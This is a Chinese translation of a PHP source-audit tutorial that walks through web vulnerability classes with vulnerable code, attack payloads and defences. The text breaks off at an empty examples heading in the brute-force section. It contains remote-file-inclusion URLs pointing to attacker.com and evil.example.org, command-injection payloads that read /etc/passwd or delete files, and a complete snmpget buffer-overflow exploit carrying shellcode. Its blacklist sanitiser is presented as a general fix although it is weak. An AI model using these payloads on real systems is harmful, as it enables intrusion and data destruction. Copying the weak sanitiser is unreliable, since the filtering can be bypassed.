@@ -1,0 +1,974 @@
+                                   PHP Fuzzing行动——源码审计
+
+作者：Shahin Ramezany
+译者：riusksk（泉哥：http://riusksk.blogbus.com）
+
+
+目录：
+Section 1:
+20种PHP源码快速审计方式
+
+Section 2:
+PHP源码审计自动化( PHP Fuzzer )
+
+风险级别：
+■ Low
+■ Medium
+■ High
+
+
+在开始PHP代码分析之前，读者必须先完成以下两项工作：
+安装PHP程序；
+使用支持PHP代码高亮的编辑器（比如Emeditor - Notepad++）。
+笔者在下文中所提供的方法仅作为简单的攻击和防御参考。本文旨在介绍攻击和防御方法。
+注意１：其中一些话题归Wikipedia版权所有
+注意２：必须在PHP源码中寻找以下变量：
+
+$_SERVER
+$_GET
+$_POST
+$_COOKIE
+$_REQUEST
+$_FILES
+$_ENV
+$_HTTP_COOKIE_VARS
+$_HTTP_ENV_VARS
+$_HTTP_GET_VARS
+$_HTTP_POST_FILES
+$_HTTP_POST_VARS
+$_HTTP_SERVER_VARS
+
+以上变量均为PHP中的可输入变量。
+注意３：关于这些变量的更多信息可访问PHP官方网站：www.php.net。
+
+Section 1: 20种PHP源码快速审计方式
+Cross Site Scripting (XSS) / CRLF [Medium]
+跨站脚本（XSS）属于WEB程序中的一类计算机安全漏洞，它允许在用户浏览的网页中注入恶意代码，比如HTML代码和客户端脚本。可利用的跨站脚本漏洞可被攻击者用于绕过访问控制，比如同源策略（same origin policy）。这类漏洞可被用于构造钓鱼攻击和浏览器攻击。
+
+攻击：
+攻击者在其请求中注入HTML代码。
+Exp 1:
+<?php
+$error_message = $_GET['error'];
+print $error_message ;
+?>
+index.php?error=<script>alert(document.cookie)</script>
+Exp 2:
+<html>
+<body>
+<input name="show_courses" value="<?php echo $_GET['show_courses']; ?>" >
+</body>
+</html>
+#http://127.0.0.1:81/1.php?show_courses="><script>alert(document.cookie);</script>
+
+防御：
+<?php
+$error_message = $_GET['error'];
+print htmlspecialchars($error_message );
+?>
+
+更多资料：
+http://ha.ckers.org/xss.html
+http://en.wikipedia.org/wiki/Cross-site_scripting
+http://www.googlebig.com/forum/cross-site-scripting-attack-and-defense-guide-t-178.html
+
+2- SQL Injection [medium]
+SQL注入是利用WEB程序数据层的安全漏洞进行代码注入的技术。当用户输入的数据中并未对嵌入的SQL声明语句进行正确过滤时，或者用户并没有被严格地限制输入，从而导致恶意代码被执行，就有可能造成SQL注入漏洞。这是一类很普遍的安全漏洞，它可在任何时候发生于被嵌入的编程或脚本语言之中。
+
+攻击：
+SQL注入是PHP代码审计过程中发现的最为严重的漏洞之一，关于这类攻击更多的信息可以通过阅读下面提供的参考资料获得，而这里只是简述此类漏洞而已。
+
+Example 1:
+<?php
+$id= $_GET['id'];
+$query= "SELECT * FROM users WHERE id= ' “ .$id." ;"
+...
+?>
+index.php?id=1+UNION+SELECT+1,@@version,3,4,5+from+users/*
+
+Example 2:
+#login.php：
+<?
+//login.php -- SQL Injection Vulnerable page
+//Attack and defence php apps book
+//shahriyar - j
+$user = $_POST['user'];
+$pass = $_POST['pass'];
+$link = mysql_connect('localhost', 'root', 'pass') or die('Error: '.mysql_e
+rror());
+mysql_select_db("sql_inj", $link);
+$query = mysql_query("SELECT * FROM sql_inj WHERE user ='".$user."' AND pas
+s ='" .$pass. "'",$link);
+if (mysql_num_rows($query) == 0) {
+echo"<scripttype=\"text/javascript\">window.location.href='index.html';</sc
+ript>";
+exit;
+}
+$logged = 1;
+?>
+
+当用户（可能为攻击者）发送$_POST['user'] , $_POST['pass']给 login.php时，这些变量直接存储在SQL请求命令中。如果攻击者发送：
+$user = 1' OR '1' = '1
+$pass = 1' OR '1' = '1
+将会绕过login.php的登陆验证，读者当注意此类代码。
+
+防御：
+下面是通用的防注入代码：
+<?php
+$title = $_POST['title']; // user input from site
+$description = $_POST['description']; // user input from site
+// define the cleaner
+$dirtystuff = array("\"", "\\", "/", "*", "'", "=", "-
+", "#", ";", "<", ">", "+", "%");
+// clean user input (if it finds any of the values above, it will replace it with
+whatever is in the quotes - in this example, it replaces the value with nothing)
+$title = str_replace($dirtystuff, "", $title); // works!
+$description = str_replace($dirtystuff, "", $description); // works!
+// input: I\ "like/ green< ** veg'et=a-bles> ;and< pizza**
+// output: I like green vegetables and pizza
+// input: a';DROP TABLE users; SELECT * FROM data WHERE name LIKE '%
+// output: aDROP TABLE users SELECT FROM data WHERE name LIKE
+?>
+<译注：最好还是采用白名单的过滤方式>
+
+更多信息 :
+http://en.wikipedia.org/wiki/Sql_injection
+http://drewish.com/files/SQL Injection Overview.ppt
+http://www.php.net/manual/en/security.database.sql-injection.php
+
+攻击实例：
+http://www.milw0rm.com/papers/241
+http://www.milw0rm.com/papers/202
+
+HTTP Response Splitting [Medium]
+HTTP响应分裂是一种WEB程序漏洞，它可以导致应用程序或者环境设置对输入值的过滤失效，也可以执行跨站脚本攻击，跨用户攻击，WEB缓存中毒以及其它类似的攻击。
+
+重要的HTTP头列表：
+
+
+在PHP语言中，我们可以使用”header”函数来设置HTTP头，在一些PHP源码中，你可以发现"header", "$_SERVER"等函数。在"$_SERVER"函数中的一些参数包含有用户输入的数据：
+REQUEST_URI, PATH_INFO, QUERY_STRING
+Example 1:
+<?php
+redirect_page = $_GET['page'];
+header ("Location: " . redirect_page);
+?>
+redirect.php?page=http://www.abysssec.com
+For $_SERVER:
+<?php
+echo "Welcome From " . $_SERVER['HTTP_REFERER'];
+?>
+
+可以使用Mozilla Firefox插件"Tamper Data"来发送通常的HTTP header：
+https://addons.mozilla.org/en-US/firefox/addon/966
+
+Example 2 :
+<?php
+$Name = "test"; //senders name
+$email = "email@adress.com"; //senders e-mail adress
+$recipient = $_GET['to'];//recipient
+$mail_body = "The text for the mail..."; //mail body
+$subject = "Subject …"; //subject
+$header = "From: ". $Name . " <" . $email . ">\r\n";
+mail($recipient, $subject, $mail_body, $header); //mail command :)
+?>
+
+CRLF是HTTP Response Splitting的另一种方式。在上面的例子中，行4中的$recipient变量并没有对所有的输入数据进行检测，以致攻击者可以添加“CC”：
+默认输入为：
+$headers = "From: myplace@here.com\r\n";
+$headers .= "CC: sombodyelse@noplace.com\r\n";
+“CC” 和 ”From” 被 ”\r\n” 分隔。
+
+污染输入：
+Mail.php?to=info@test.com\r\nCC: sombodyelse@noplace.com
+
+防御：
+1- 检测Mail Header的输入值
+2- 可使用以下方式输入，而不用URL输入：
+<?php
+$id = $_GET['url_id'];
+if ($id == 1) {
+header ("Location: " . redirect_page);
+}
+?>
+
+和:
+
+<?php
+echo "Welcome From " . htmlspecialchars($_SERVER['HTTP_REFERER']);
+?>
+攻击实例:
+(video) : http://www.milw0rm.com/video/watch.php?id=28
+http://www.securiteam.com/unixfocus/6F00Q0K6AK.html
+http://o0o.nu/~meder/o0o_Blogger_HTTP_response_splitting.txt
+http://www.securityfocus.com/archive/1/369405
+
+4- 动态赋值漏洞 [High]:
+1-当使用动态函数加载时，可通过请求来执行指定的函数，导致攻击者可以执行任意函数。
+攻击：
+<?php
+$myfunc = $_GET['myfunc'];
+$myfunc();
+?>
+Index.php?myfunc=phpinfo
+2-全局函数漏洞
+Register Global是危险的“PHP扩展”：
+当其打开时，register_globals可利用各种变量注入脚本代码，比如来自HTML表单的请求。这种漏洞主要与PHP变量未初始化相关，以致轻而易举地即可向其写入恶意代码。这是一个艰难地抉择，但PHP官方最后依然决定在默认情况下禁止该指令。当允许该指令时，用户仍可使用变量，但无法确定它是来自哪里，而只能靠猜测。在脚本中定义的内部变量很容易与用户发送的请求数据相混淆，而只能通过禁止register_globals来解决这种情况。下面演示一个未使用register_globals的例子：
+Admin.php
+<?php
+if (isset($is_admin)) {
+//Yes, I'm the admin so call the Administration Pannel
+[...]
+} else {
+//No, I'm not the admin
+[...]
+}
+?>
+# admin.php?is_admin=1
+另一个说明register_globals存在问题的例子就是下面关于动态路径的包含：
+<?php
+include "$path/script.php";
+?>
+当允许register_globals时，可用以下方式请求页面：
+Index.php?path=http://evil.example.org/?
+相当于下面的请求：
+<?php
+include 'http://evil.example.org/?/script.php';
+?>
+
+注意（php.ini配置）：
+如果allow_url_fopen 是enabled（默认情况下是enabled,甚至在php.ini中民被推荐的设置），这将包含http://evil.example.org/的输出，正如本地文件一般。这是一个严重的安全漏洞，这也是在一些开源的代码程序中被发现的。
+防御：
+不要使用这种方式去加载函数，这是一个危险地带！任何时候，任何情况下，Register Global都应该关闭！或者将变量的内容设置如下：
+<?php
+$is_admin =();
+if (isset($is_admin)) {
+//Yes, I'm the admin so call the Administration Pannel
+[...]
+} else {
+//No, I'm not the admin
+[...]
+}
+?>
+
+攻击实例 / 信息：
+http://www.milw0rm.com/exploits/7705
+http://wiki.lunarpages.com/PHP_and_Register_Global_Variables
+
+5- 进程控制/PHP代码注入 (HIGH):
+当我们使用下列函数：“PHP进程执行函数&进程控制”，并且用户可以输入变量（见上面），那么将导致任意的PHP代码被执行。
+PHP进程控制列表：
+Exec
+system
+passthru
+shell_exec
+proc_open
+pcntl_exec
+
+Example 1:
+<?php
+$page = $_GET['page'];
+system ("type " . $page);
+?>
+# index.php?page=/etc/passwd | uname –a
+
+Example 2:
+下列代码是来自一项管理系统的WEB程序，它允许用户封装批处理文件进行Oracle数据库备份，然后运行cleanup.bat脚本去清除一些临时文件。rmanDB.bat可接受单命令行参数，由它指定备份类型。因为数据库访问是受限的，备份程序需要权限用户才可执行。
+<?
+...
+$btype = $_GET['backuptype'];
+$cmd = "cmd.exe /K \"c:\\util\\rmanDB.bat " . $btype . "&&c:\\utl\\cleanup.
+bat\"";
+system(cmd);
+...
+?>
+这个问题主要是读取用户数据的backuptype参数时未对其进行任何有效地过滤所导致的。特别是Runtime.exec()函数将不能执行多条命令，但在这种情况下，程序为了单次调用Runtime.exec()以执行多条命令，它就得先去执行cmd.exe shell。Shell一经调用，它将会分别执行被点号分隔的多条命令。如果攻击者发送一条经恶意构造的命令"&& del c:\\dbms\\*.*",那么程序将随之执行该条命令。由于程序需要一定的权限才能与数据库交互，因此被注入的任何命令都将以此权限运行。
+当程序员使用eval()函数操作内部数据时，这些数据都可能会被攻击者关注到，因为它很容易导致代码执行漏洞的发生：
+<?php
+$install = $_REQUEST['install_command'];
+eval($install);
+?>
+上面的代码如玫瑰香一般诱人，因为它可能被用来执行代码注入。
+install.php?install_command=phpinfo();
+实例代码：
+<?php
+[...]
+$register_poll_vars = array("id","template_set","action");
+for ($i=0;$i<sizeof($register_poll_vars);$i++) {
+if (isset($HTTP_POST_VARS[$register_poll_vars[$i]])) {
+eval("\$$register_poll_vars[$i] =
+\"".trim($HTTP_POST_VARS[$register_poll_vars[$i]])."\";");
+} elseif (isset($HTTP_GET_VARS[$register_poll_vars[$i]])) {
+eval("\$$register_poll_vars[$i] =
+\"".trim($HTTP_GET_VARS[$register_poll_vars[$i]])."\";");
+} else {
+eval("\$$register_poll_vars[$i] = '';");
+}}
+[...]
+?>
+$$register_poll_vars[$i] 是用户输入的变量。
+
+http://[target]/comments.php?id=";[PHPCODE]//&template_set=";[PHPCODE]//&action=";[PHPCODE]//
+
+攻击实例：
+http://www.milw0rm.com/exploits/3758
+http://www.milw0rm.com/exploits/309
+
+6- 本地/远程文件包含(High):
+本地或者远程文件包含是PHP代码审计中的高危漏洞，攻击者可利用它加载本地或者远程文件到PHP WEB页面。
+危险函数：
+include
+include_once
+require
+require_once
+show_source
+highlight_file
+readfile
+file_get_contents
+fopen
+file
+
+通常，PHP中的每一个“文件系统函数”都可能是危险的，可参见这里：
+http://ir.php.net/manual/en/ref.filesystem.php
+本地文件包含：
+<?php
+include('../geshi.php');
+if ( isset($_POST['submit']) ) //*
+{
+//*
+if ( get_magic_quotes_gpc() ) $_POST['source'] =
+stripslashes($_POST['source']);
+if ( !strlen(trim($_POST['source'])) )
+{
+//BUG is HERE
+$_POST['source'] = implode('', @file('../geshi/' . $_POST['language'] .
+'.php'));
+$_POST['language'] = 'php';
+}
+?>
+在星号*标记的一行中，如果存在变量$_POST ['submit']和 $_POST ['language'],那么你就可以读取任何的PHP文件。因此，我们可以利用此漏洞读取config.php文件！
+Exploit:
+<form action="http://[HOST]/example.php" method="post">
+Path to file:
+example: ../../../../config
+<textarea name="language"></textarea>
+<input type="submit" name="submit" value="See">
+</form>
+注意：
+在本地文件包含（LFI）攻击中，攻击者可读取对方主机中的任何日志文件和本地文件。也许这种文件浏览并不能造成多大危害，但攻击者可先构造一个错误，然后该错误会被记录在服务器上的日志文件中(apache log / error log等等)。当攻击者向目标主机请求一个未存在的文件时：
+Test000.php?code=<?php;phpinfo();?>
+这将会把全路径地址都记录在error.log文件中（在本例中，你的日志文件路径可能与笔者不同），与此同时，当我们利用LFI漏洞的变量去加载error.log时，攻击者即可执行自己的PHP代码。
+默认日志文件路径列表：
+var/log/httpd/access_log
+var/log/httpd/error_log
+apache/logs/error.log
+apache/logs/access.log
+apache/logs/error.log
+apache/logs/access.log
+apache/logs/error.log
+apache/logs/access.log
+apache/logs/error.log
+apache/logs/access.log
+apache/logs/error.log
+apache/logs/access.log
+logs/error.log
+logs/access.log
+logs/error.log
+logs/access.log
+logs/error.log
+logs/access.log
+logs/error.log
+logs/access.log
+logs/error.log
+logs/access.log
+etc/httpd/logs/access_log
+etc/httpd/logs/access.log
+etc/httpd/logs/error_log
+etc/httpd/logs/error.log
+var/www/logs/access_log
+var/www/logs/access.log
+usr/local/apache/logs/access_log
+usr/local/apache/logs/access.log
+var/log/apache/access_log
+var/log/apache/access.log
+var/log/access_log
+var/www/logs/error_log
+var/www/logs/error.log
+usr/local/apache/logs/error_log
+usr/local/apache/logs/error.log
+var/log/apache/error_log
+var/log/apache/error.log
+var/log/access_log
+var/log/error_log
+Example:
+http://www.milw0rm.com/exploits/2270
+（译注：关于更多的LFI2RCE技术可以参见我在博客http://riusksk.blogbus.com上写的一篇文章《利用PHP代码实现LFI2RCE》,网上对本文的转载是不完整的，因为后来我又补写了一段上去。）
+
+远程文件包含：
+远程文件包含攻击允许恶意用户在存在漏洞的主机上运行自己的PHP代码，攻击者可包含存放在网上空间中用PHP编写的网页（恶意）代码。例如下面的一段漏洞代码：
+<?php
+if (eregi("theme.php", $_SERVER['PHP_SELF']))
+die();
+global $theme, $_FNROOTPATH,$lang; //<-- REQUEST Variable
+global $forumback, $forumborder;
+$_FN['table_background']=&$forumback;
+$_FN['table_border']=&$forumborder;
+if ($forumback=="" && $forumborder==""){
+$forumback="ffffff";
+$forumborder="000000";
+} // Load File
+require_once ($_FNROOTPATH . "themes/$theme/theme.php");
+...
+?>
+Exploit:
+由于变量$_FNROOTPATH未明确地指定数值，因此攻击者可以注入本地的恶意文件到URL中，并在目标服务器上执行：
+http://localhost/~flatnux/index.php?_FNROOTPATH=http://attacker.com/shell.php%00
+攻击实例：
+http://www.milw0rm.com/exploits/8066
+http://www.milw0rm.com/exploits/8025
+http://www.milw0rm.com/exploits/7939
+http://www.milw0rm.com/exploits/7969
+http://www.milw0rm.com/exploits/6817
+
+7 –文件管理 (HIGH):
+有些PHP函数可用于文件管理，如果偷懒的程序员没有对输入变量进行很好地检测，那么就可能造成这种高危漏洞。
+Copy函数:
+<?php
+$file = $_GET['cpFile'];
+$newfile = "/user/local/www/html/tmp/file.php";
+if (!copy($file, $newfile)) {
+echo "failed to copy $file...\n";
+} else {
+echo " thanks .."
+}
+?>
+攻击者可以复制其它文件，比如'/etc/passwd' into '$newfile'，然后读取它。
+http://victim.com/index.php?cpfile=/etc/passwd
+其它危险函数如下：
+文件删除 [见PHP.Net]:
+Rmdir
+unlink
+delete
+fwrite
+压缩 & 解压缩函数:
+<?php
+$file = "/tmp/foo.bz2";
+$bz = bzopen($file, "r") or die("Couldn't open $file for reading");
+bzclose($bz);
+?>
+
+8- 缓冲区溢出 (High, 但难利用):
+当程序员使用下面的危险函数时:
+confirm_phpdoc_compiled
+mssql_pconnect
+mssql_connect
+crack_opendict
+snmpget
+ibase_connect
+缓冲区溢出漏洞就可能发生在上面的函数中。
+
+缓冲区溢出举例(snmpget())：
+<?php
+$host = $_GET['host'];
+$timeout = $_GET['timeout'];
+$syscontact = snmpget("$host", "public", "$timeout");
+?>
+
+Exploit:
+<?php
+// PHP 4.4.6 snmpget() object id local buffer overflow poc exploit
+// rgod [-> R.I.P] + Edited By Abysssec INC
+// site: http://retrogod.altervista.org
+// win xp sp2 version
+if (!extension_loaded("snmp")){
+die("you need the snmp extension loaded.");
+}
+$____scode=
+"\xeb\x1b".
+"\x5b".
+"\x31\xc0".
+"\x50".
+"\x31\xc0".
+"\x88\x43\x59".
+"\x53".
+"\xbb\x6d\x13\x86\x7c". //WinExec
+"\xff\xd3".
+"\x31\xc0".
+"\x50".
+"\xbb\xda\xcd\x81\x7c". //ExitProcess
+"\xff\xd3".
+"\xe8\xe0\xff\xff\xff".
+"\x63\x6d\x64".
+"\x2e".
+"\x65".
+"\x78\x65".
+"\x20\x2f".
+"\x63\x20".
+"start notepad & ";
+$edx="\x64\x8f\x9b\x01"; //jmp scode
+$eip="\x73\xdc\x82\x7c"; //0x7C82DC73 jmp edx
+$____suntzu=str_repeat("A",188).$edx.str_repeat("A",64).$eip.str_repeat("\x
+90",48).$____scode.str_repeat("\x90",48);
+//more than 256 chars result in simple eip overwrite
+$curl = curl_init();
+//Send Time out
+curl_setopt ($curl, CURLOPT_URL, "http://target.com/snmp.php?host=127.0.
+0.1&timeout=$____suntzu");
+curl_exec ($curl);
+curl_close ($curl);
+?>
+
+9- Cookie / Session injection / Fixation / [High]:
+会话安全是一个高端话题，成为被频繁攻击的目标也就不足为奇了。主要的session攻击包括会话冒充，攻击者可以访问到由其它用户发起的会话。对于攻击者而言，最为重要的信息莫过于会话ID（session identifier），因为这是完成会话冒充攻击必备的条件。下面有三种方法可以获得一个有效的会话ID：
+　　●预测法
+　　●捕获法
+　　●注视法
+预测法可用于猜测有效的会话ID。由于PHP本有的会话机制，会话ID都是非常随机化的，因此这里并不是执行攻击的最薄弱点。
+　　捕获有效的会话ID是最为普遍的会话攻击类型，当然，这还有很多其它方法。由于会话ID是在cookies或者GET变量中传输的，因此各种攻击方式都主要聚焦于这些传输方式。当浏览器存在一些关于cookies的漏洞时（大部分是发生在Internet Explorer中），cookies比GET变量曝露会话ID的机率更低，因此对于大多数使用cookies的用户，你可以为他们提供一种更为安全的传输机制——利用cookie传输会话ID。
+	注视法是获取有效会话ID最为简单的方式。这种方法很难被防御，但如果你的会话机制仅仅使用session_start()，那么就可能存在漏洞。为了演示这种会话注视法，请看下面的代码,session.php:
+
+<?php
+session_start();
+if (!isset($_SESSION['visits']))
+{
+$_SESSION['visits'] = 1;
+}
+else
+{
+$_SESSION['visits']++;
+}
+echo $_SESSION['visits'];
+?>
+
+当首次访问该页面时，你可以看到1被输出到屏幕上。在随后的每次访问中，该数值将会随之增加，以反映页面访问次数。
+　　为了演示session fixation，首先需要确保你的电脑上并不存在会话ID（可以删除cookies），然后将?PHPSESSID=1234添加到URL中以访问该页面。接着，以完全不同的浏览器（甚至是完全不同的计算机）访问添加了?PHPSESSID=1234的URL地址。此时你将会看到屏幕上并没有输出1，而是继续你之前开始的会话。
+　　为何存在这种问题呢？大部分的session fixation攻击只是简单地使用一个链接或者一个协议，以将用户重定向到一个包含会话ID的URL地址的远程站点。用户可能并不会注意到，因为这个站点将显示完全相同的内容。由于会话ID已被获知了，那么就可以利用它来发动伪造攻击，比如会话劫持（session hijacking）。
+	一次像这样简单的攻击是很容易被阻止的。如果正在活动的会话与用户拥有的会话ID无关，那么它可以重新生成会话ID：
+<?php
+session_start();
+if (!isset($_SESSION['initiated']))
+{
+session_regenerate_id();
+$_SESSION['initiated'] = true;
+}
+?>
+
+对于这样简单的防御，攻击者只需用一个特定的会话ID初始化session即可，然后使用该ID发动攻击。为了阻止这类攻击，首先应当知道会话劫特只在用户登陆后有效，或者要不然就是获得高权限后才有用。因此，如果当权限级别改变时（例如核实用户名和密码后），我们就应该修改即将重新生成的会话ID，这样我们才能真正地消除被session fixation攻击的风险。
+
+会话劫持（Session Hijacking）
+
+在所有被用来访问他人会话的攻击技术中，会话劫持无疑是最普遍的一种会话攻击技术。正如session fixation一样，如果你的会话机制仅由session_start()组成，那么它就存在漏洞，即使利用起来并不简单。与其关注如何阻止会话ID被窃取，倒不如想想如何成功地完成一次会话ID窃取。由于会话伪造的每一步复杂化都会提高我们的安全性，因此为了将会话劫持复杂化，我们需要检查成功完成会话劫持所需要的每一步骤。在每一种方案中，我们都将假设会话ID已被窃取。在最为简单的会话机制中，一个有效的会话ID是会话劫持成功与否的关键所在。为了完善它，我们需要查看用于其它认证的HTTP请求中是否还有其它东西。
+
+注意
+单纯地依靠TCP/IP层上的东西（比如IP地址）是不明智的，因为一些更为底层的协议无法兼容发生在HTTP层上的行为。一个用户可能用不同的IP地址去完成每一次的请求，多个用户也可能拥有共同的IP地址。
+
+一个典型的HTTP requtest:
+GET / HTTP/1.1
+Host: example.org
+User-Agent: Mozilla/5.0 Gecko
+Accept: text/xml, image/png, image/jpeg, image/gif, */*
+Cookie: PHPSESSID=1234
+
+由于Host header是HTTP/1.1所必需的，因此依靠其它信息是不明智的。但是，防御的坚固程度确实是我们所需要的，因为我们关注的是如何增加会话伪造的难度，以防止危害到合法用户。假设之前的request是由下面与之不同的User-Agent请求的：
+
+GET / HTTP/1.1
+Host: example.org
+User-Agent: Mozilla Compatible (MSIE)
+Accept: text/xml, image/png, image/jpeg, image/gif, */*
+Cookie: PHPSESSID=1234
+
+虽然相同的cookie是存在的，但是是否可以假设它们是同一用户呢？这似乎与浏览器更改请求包中的User-Agent header很不同吧？下面我们修改会话机制以进行对比：
+
+<?php
+session_start();
+if (isset($_SESSION['HTTP_USER_AGENT']))
+{
+if ($_SESSION['HTTP_USER_AGENT'] != md5($_SERVER['HTTP_USER_AGENT']))
+{
+/* Prompt for password */
+exit;
+}
+}
+else
+{
+$_SESSION['HTTP_USER_AGENT'] = md5($_SERVER['HTTP_USER_AGENT']);
+}
+?>
+
+现在攻击者不仅需要提供一个有效的会话ID，而且还必须提供与会话中相匹配的User-Agent header。虽然这使事情轻微的复杂化，但这可以使它变得更为安全了。
+我们是否还可以再提高它的安全性呢？人们认为获取cookie值的通用方式就是利用浏览器（比如IE）漏洞。这些攻击方式包括受害者访问攻击者的恶意站点，因此攻击者也可以获取正确的User-Agent header。这就要求我们必须采取其它的保护方式以对抗这种情况。如果我们要求用户在每一项请求中都必须传输User-Agent的MD5值，那么攻击者将无法篡改受害者的请求包中所包含的头信息了，但这也将需要再发送一项附加信息了。当这一特定的token容易被猜测到时，我们可以将这一猜想工作复杂化，以提高猜想的难度，这只需简单地添加一个随机生成的额外数据即可构造出token：
+
+<?php
+$string = $_SERVER['HTTP_USER_AGENT'];
+$string .= 'SHIFLETT';
+/* Add any other data that is consistent */
+$fingerprint = md5($string);
+?>
+
+记住，我们是在cookie中传输会话ID的，这就导致了攻击者常常得去破坏cookie（可能所有的HTTP头也是如此）才能窃取到会话ID，因此我们应该以URL变量来传输fingerprint。这些都必须在所有的URL中传输，即使是会话ID也是如此，因为这些都是必需的，这样会话才能自动地保持下去（还得通过所有检测）。
+为了确保合法用户不会像犯人一样被对待，这就需要在检测失败时要求输入密码。如果在你的检测方法中存在错误，比如错误地判断一个发动伪造攻击的用户，那么在继续操作前就得要求输入密码，以确保在这种情况下受到最小的攻击。事实上，用户可能在察觉到这种请求方式后，会感激你添加了这种保护方式。
+其实还有其它各种不同的方法可以用来提高伪造会话的复杂程度，以防止发生会话劫持。同时希望在对session_start()的额外处理上，你可以有自己的想法。总之只需记住：为难坏小子，方便好小子。
+
+攻击实例：
+http://www.milw0rm.com/exploits/3508
+http://www.milw0rm.com/exploits/858
+http://www.milw0rm.com/exploits/871
+
+10 – 拒绝服务[Medium, But Hard Assessment]:
+WEB程序特别容易受到拒绝服务攻击。一个WEB程序很难讲清恶意数据传输与普通数据传输之间的不同，这里面有多方面的因素，但是其中最为重要的一点就是：由于多种原因,IP地址不能作为可行的鉴定证书。由于没有一种可靠的方式可以得知HTTP request来自哪里，这就导致很难过滤掉一些恶意的数据传输。对于分布式攻击，程序又该如何去辨别真实攻击与多用户同时重载数据（网站的这种临时问题是可能发生的）或者获取“slash dotted”之间的不同呢？
+例如：
+
+<?php
+//....
+$user_mode=$_SERVER['HTTP_USER_AGENT'];
+$user_ip=$_SERVER['SERVER_ADDR'];
+$sql = "INSERT INTO tbl_name (..) VALUES($user_mode,$user_ip);";
+//Summon Myssql For each Request and Write into it.
+//..
+?>
+
+当一些访问者请求查看目标站点时，他们的信息（例如IP及浏览器信息）将会被记录在MYSQL数据库中。与此同时，当一些用户（或者一些攻击者发动请求）发送请求后，Mysql 服务器将对其进行处理。
+其它循环函数，比如：[While, for ...]
+一旦攻击者可摧毁一些必需的资源，那么他们就可以阻止合法用户使用系统。一些被限制的资源包括带宽，数据库连接，磁盘存储，CPU，内存，线程，或者程序特定资源。
+
+攻击实例：
+http://archive.cert.uni-stuttgart.de/bugtraq/2006/01/msg00397.html
+http://www.derkeiler.com/Mailing-Lists/securityfocus/bugtraq/2006-03/msg00092.html
+
+在上例中：
+
+profile.php：注册用户，注册中我们可以使安全代码图片失效
+search.php：通过数据库不能记录到的方式进行搜索。
+
+11 - XPath注入 [XML函数]:
+SQL注入是最为普遍的代码注入攻击方式，但我们这里要讲述的是其它一些可危害到你的程序及数据的其它注入攻击方式，主要包括LDAP注入和XPath注入。'XPath injection'与SQL注入攻击相似，但它的攻击目标是XML document，而非SQL数据库。'XPath Injection'是用于攻击WEB站点的攻击技术，用于构造来自用户提供的XPath请求。
+例如：
+
+<?php
+$test = $_GET['test'];
+if ($test){
+$xml = simplexml_load_file("1.xml");
+$result = $xml->xpath($test);
+print_r($result);
+}
+?>
+1.xml :
+<?xml version="1.0" encoding="UTF-8"?>
+<note>
+<to>Tove</to>
+<from>Jani</from>
+<heading>Reminder</heading>
+<body>Don't forget me this weekend!</body>
+</note>
+
+Good Query :
+Index.php?test=from
+
+Good Result :
+Array ( [0] => SimpleXMLElement Object ( [0] => Jani ) )
+
+Bad Query :
+Index.php?test=*
+
+Good Result For US ! :
+Array ( [0] => SimpleXMLElement Object ( [0] => Tove ) [1] => SimpleXMLElement Object ( [0] => Jani
+) [2] => SimpleXMLElement Object ( [0] => Reminder ) [3] => SimpleXMLElement Object ( [0] =>Don't forget me this weekend! ) )
+
+这是一个存在漏洞的PHP程序！
+注意：
+Xpath Injection有多种方式，比如SQL/Xpath Inject , Basic Xpath Inject & …
+
+更多信息：
+http://www.modsecurity.org/archive/amit/blind-xpath-injection.pdf
+http://www.ibm.com/developerworks/xml/library/x-xpathinjection.html
+http://joginipally.blogspot.com/2007/10/code-injection-xpath-injection.html
+http://www.webappsec.org/projects/threat/classes/xpath_injection.shtml
+
+攻击实例：
+http://www.securityfocus.com/archive/1/466211
+
+12 – 常被滥用: 文件上传 (High):
+当允许文件上传到你的系统时，你就得承担一定的风险，因为文件可能并非它所显示出来的那样（伪装为图片以上传PHP脚本，并将其移动到他们可以运行它的地方等等）。如果你的站点不需要上传文件，那么禁止它将可以防止因疏忽造成的错误而被上传恶意文件。
+Example 1：下列代码用于处理上传的文件，它将文件移动到WEB根目录下。攻击者可以上传恶意PHP源文件给该程序以及来自服务端的后续请求，这将导致它们被PHP解释器执行（查找$_FILES函数）。
+
+<?php
+$udir = './'; // Relative path under Web root
+$ufile = $udir . basename($_FILES['userfile']['name']);
+if (move_uploaded_file($_FILES['userfile']['tmp_name'], $ufile)) {
+echo "Valid upload received\n";
+} else {
+echo "Invalid upload rejected\n";
+} ?>
+
+即使程序将文件存储在一个不可通过WEB访问的目录下，攻击者依然可以将恶意内容注入到服务端环境中以发动其它攻击。如果程序易遭受到路径操作，命令注入或者远程文件包含漏洞等的影响，那么攻击者可能会上传一个包含恶意内容的文件，以使程序通过可利用的漏洞去读取或执行它。
+
+攻击 (发送文件):
+
+<html>
+　　<body> <form enctype="multipart/form-data" method=POST>
+　　　　　　　<input type=file name="userfile">
+　　　　　　　<input type="submit">
+　　　　　</form>
+　　</body>
+</html>
+
+防御：
+如果用户并不需要上传文件，那么就关闭它。
+PHP.ini:
+file_uploads = off
+
+攻击实例:
+http://www.milw0rm.com/exploits/2937
+http://securityvulns.com/Tdocument590.html
+
+13 – 函数/文件的未认证调用(Medium):
+一些管理目录下的文件原本是禁止访问的，但由于程序员忘记对这些文件进行验证，以致漏洞的发生。攻击者必须对存在此问题的文件进行检测。当PHP程序在未经许可的情况下调用管理函数时，攻击者可调用这些函数：
+
+#index.php
+<?php
+include ("Function.php");
+$action=$_GET['action'];
+if ($action == $actionArray[$action][0])) {
+#load proper Function with $_GET
+...
+}
+?>
+
+#Function.php
+<?php
+$actionArray = array(
+　　　'activate' => array('Register, 'Activate'),
+　　　'admin' => array('Admin', 'Admin'),
+　　　'upload'=> array('Post', 'upload'),
+　　　'ban' => array('ManageBans', 'Ban),
+);
+function Forum (){
+#Authorize Function
+...
+}
+Function upload (){
+# admin function without Permission
+...
+}
+}
+本例中攻击者可在未经许可的情况下加载管理函数：
+# index.php?action=upload
+
+14 – 通过暴力破解绕过登陆验证 (Low):
+当程序员未对尝试登陆失败的次数进行检测时，攻击者可以在一些登陆页面上通过暴力破解绕过验证。
+注意：当一个懒惰的程序员使用basic authentication来保护他/她的控制面板时，这将给攻击者提供一次暴力破解的机会。
+
+<?php
+if (!isset($_SERVER['PHP_AUTH_USER'])) {
+header('WWW-Authenticate: Basic realm="My Realm"');
+header('HTTP/1.0 401 Unauthorized');
+echo 'Text to send if user hits Cancel button';
+exit;
+} else {
+echo "<p>Hello {$_SERVER['PHP_AUTH_USER']}.</p>";
+echo "<p>You entered {$_SERVER['PHP_AUTH_PW']} as your password.</p>";
+}
+?>
+攻击实例:
